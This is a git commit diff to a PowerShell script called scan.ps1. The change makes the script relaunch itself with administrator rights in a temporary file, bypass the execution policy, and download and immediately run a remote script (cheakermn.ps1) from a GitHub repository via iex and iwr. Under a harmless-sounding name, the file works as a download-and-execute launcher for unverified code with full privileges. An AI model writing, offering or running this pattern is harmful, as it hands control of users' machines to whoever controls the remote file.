6eac8ef79fa6e12d8b86f8adb061824f34be3a5e
server <petrovolosuk310@gmail.com>
2026-03-20 12:16:04 +0200

    Update scan.ps1

--- scan.ps1
+++ scan.ps1
@@ -1,12 +1,18 @@
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 
 if (-NOT $isAdmin) {
-    $arguments = "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"& '$PSCommandPath'`""
-    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
+    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+    $scriptContent = @'
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+Set-ExecutionPolicy Bypass -Scope Process -Force
+iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
+Read-Host "Нажмите Enter для выхода"
+'@
+    $scriptContent | Out-File -FilePath $tempScript -Encoding UTF8
+    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -File `"$tempScript`""
     exit
 }
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
-
-pause
+Read-Host "Нажмите Enter для выхода"
